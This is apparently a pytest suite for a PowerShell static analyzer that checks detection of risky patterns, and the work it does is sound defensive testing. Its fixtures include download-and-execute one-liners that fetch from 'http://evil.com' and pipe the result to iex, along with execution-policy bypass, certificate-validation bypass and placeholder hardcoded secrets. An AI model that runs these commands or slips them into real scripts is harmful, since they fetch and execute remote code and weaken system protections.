"""
Test suite for PowerShell Analyzer.
Tests PS001-PS006 security rules.
"""

import pytest

from hefesto.analyzers.devops.powershell_analyzer import PowerShellAnalyzer


class TestPS001InvokeExpression:
    """Tests for PS001: Invoke-Expression detection."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_invoke_expression_detected(self, analyzer):
        """Invoke-Expression should trigger PS001."""
        content = "Invoke-Expression $command"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS001" for i in issues)

    def test_iex_alias_detected(self, analyzer):
        """iex alias should trigger PS001."""
        content = "iex $script"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS001" for i in issues)

    def test_invoke_expression_case_insensitive(self, analyzer):
        """Detection should be case-insensitive."""
        content = "INVOKE-EXPRESSION $cmd"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS001" for i in issues)

    def test_invoke_expression_in_comment_ignored(self, analyzer):
        """Invoke-Expression in comment should be ignored."""
        content = "# Invoke-Expression is dangerous"
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS001" for i in issues)

    def test_invoke_expression_in_string_ignored(self, analyzer):
        """Invoke-Expression in string should be ignored."""
        content = "$msg = 'Use Invoke-Expression carefully'"
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS001" for i in issues)


class TestPS002DownloadExecute:
    """Tests for PS002: Download + Execute pattern."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_downloadstring_iex_detected(self, analyzer):
        """DownloadString piped to iex should trigger PS002."""
        content = "(New-Object Net.WebClient).DownloadString('http://evil.com') | iex"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS002" for i in issues)

    def test_invoke_webrequest_iex_detected(self, analyzer):
        """Invoke-WebRequest piped to iex should trigger PS002."""
        content = "Invoke-WebRequest http://evil.com | Invoke-Expression"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS002" for i in issues)

    def test_webclient_downloadstring_detected(self, analyzer):
        """WebClient.DownloadString usage should trigger PS002."""
        content = "$wc = New-Object Net.WebClient; $wc.DownloadString('url')"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS002" for i in issues)

    def test_iwr_alias_iex_detected(self, analyzer):
        """iwr alias piped to iex should trigger PS002."""
        content = "iwr http://evil.com | iex"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS002" for i in issues)


class TestPS003StartProcess:
    """Tests for PS003: Start-Process injection risks."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_start_process_variable_detected(self, analyzer):
        """Start-Process with variable should trigger PS003."""
        content = "Start-Process $userInput"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS003" for i in issues)

    def test_start_process_concatenation_detected(self, analyzer):
        """Start-Process with concatenated args should trigger PS003."""
        content = 'Start-Process cmd -ArgumentList "/c " + $cmd'
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS003" for i in issues)

    def test_start_process_literal_safe(self, analyzer):
        """Start-Process with literal should NOT trigger PS003."""
        content = 'Start-Process "notepad.exe"'
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS003" for i in issues)


class TestPS004HardcodedSecrets:
    """Tests for PS004: Hardcoded secrets."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_password_variable_detected(self, analyzer):
        """Hardcoded password variable should trigger PS004."""
        content = '$password = "supersecret123"'
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS004" for i in issues)

    def test_api_key_detected(self, analyzer):
        """Hardcoded API key should trigger PS004."""
        content = "$apiKey = 'sk-1234567890abcdef'"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS004" for i in issues)

    def test_securestring_plaintext_detected(self, analyzer):
        """ConvertTo-SecureString with plaintext should trigger PS004."""
        content = '$secPwd = ConvertTo-SecureString "password123" -AsPlainText -Force'
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS004" for i in issues)

    def test_env_variable_safe(self, analyzer):
        """Using environment variable should NOT trigger PS004."""
        content = "$password = $env:MY_PASSWORD"
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS004" for i in issues)


class TestPS005ExecutionPolicy:
    """Tests for PS005: Execution policy bypass."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_set_executionpolicy_bypass_detected(self, analyzer):
        """Set-ExecutionPolicy Bypass should trigger PS005."""
        content = "Set-ExecutionPolicy Bypass -Force"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS005" for i in issues)

    def test_executionpolicy_unrestricted_detected(self, analyzer):
        """Set-ExecutionPolicy Unrestricted should trigger PS005."""
        content = "Set-ExecutionPolicy Unrestricted"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS005" for i in issues)

    def test_command_line_bypass_detected(self, analyzer):
        """Command line -ExecutionPolicy Bypass should trigger PS005."""
        content = "powershell.exe -ExecutionPolicy Bypass -File script.ps1"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS005" for i in issues)

    def test_remotesigned_safe(self, analyzer):
        """Set-ExecutionPolicy RemoteSigned should NOT trigger PS005."""
        content = "Set-ExecutionPolicy RemoteSigned"
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS005" for i in issues)


class TestPS006TLSBypass:
    """Tests for PS006: TLS/Certificate validation bypass."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_cert_callback_override_detected(self, analyzer):
        """ServerCertificateValidationCallback override should trigger PS006."""
        content = (
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback" " = { $true }"
        )
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS006" for i in issues)

    def test_ssl3_enabled_detected(self, analyzer):
        """Enabling SSL3 should trigger PS006."""
        content = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS006" for i in issues)

    def test_skip_certificate_check_detected(self, analyzer):
        """-SkipCertificateCheck should trigger PS006."""
        content = "Invoke-WebRequest https://api.example.com -SkipCertificateCheck"
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS006" for i in issues)

    def test_tls12_safe(self, analyzer):
        """Using TLS 1.2 should NOT trigger PS006."""
        content = (
            "[Net.ServicePointManager]::SecurityProtocol = " "[Net.SecurityProtocolType]::Tls12"
        )
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS006" for i in issues)


class TestCommentAndStringMasking:
    """Tests for comment and string masking functionality."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_block_comment_ignored(self, analyzer):
        """Content in block comments should be ignored."""
        content = """<#
Invoke-Expression is dangerous
iex should not be used
#>
Write-Host "Hello"
"""
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS001" for i in issues)

    def test_double_string_ignored(self, analyzer):
        """Content in double-quoted strings should be ignored."""
        content = '$msg = "Never use Invoke-Expression"'
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS001" for i in issues)

    def test_single_string_ignored(self, analyzer):
        """Content in single-quoted strings should be ignored."""
        content = "$msg = 'Invoke-Expression is bad'"
        issues = analyzer.analyze("test.ps1", content)
        assert not any(i.rule_id == "PS001" for i in issues)

    def test_real_code_after_comment_detected(self, analyzer):
        """Real code after comment should be detected."""
        content = """# This is a comment
Invoke-Expression $cmd
"""
        issues = analyzer.analyze("test.ps1", content)
        assert any(i.rule_id == "PS001" for i in issues)


class TestLineNumberAccuracy:
    """Tests for accurate line number reporting."""

    @pytest.fixture
    def analyzer(self):
        return PowerShellAnalyzer()

    def test_line_number_first_line(self, analyzer):
        """Issue on first line should report line 1."""
        content = "iex $cmd"
        issues = analyzer.analyze("test.ps1", content)
        assert len(issues) > 0
        assert issues[0].line == 1

    def test_line_number_multiline(self, analyzer):
        """Line numbers should be accurate in multiline content."""
        content = """# Line 1
# Line 2
iex $cmd
# Line 4
"""
        issues = analyzer.analyze("test.ps1", content)
        ps001_issues = [i for i in issues if i.rule_id == "PS001"]
        assert len(ps001_issues) == 1
        assert ps001_issues[0].line == 3
